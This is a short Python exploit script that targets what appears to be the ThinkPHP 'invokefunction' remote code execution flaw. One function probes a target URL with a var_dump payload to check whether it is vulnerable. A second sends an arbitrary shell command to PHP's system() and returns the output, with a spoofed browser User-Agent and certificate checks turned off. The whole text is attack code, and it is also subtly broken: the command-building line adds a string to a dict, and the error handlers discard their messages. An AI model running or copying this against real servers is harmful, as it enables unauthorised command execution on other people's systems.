import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}


def exp_check(url):
    try:
        rp = requests.get(url + "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=(check)",headers=headers,verify=False)
        if rp.status_code==200 and 'check' in rp.text:
            return 1
        else:
            return 2

    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3


def exp_cmd(url,cmd):
    try:

        rp = requests.get(url+"/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=("+{}+")".format(cmd),headers=headers,verify=False)
        if  rp.text != "" and rp.status_code == 200:
            return rp.text


    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3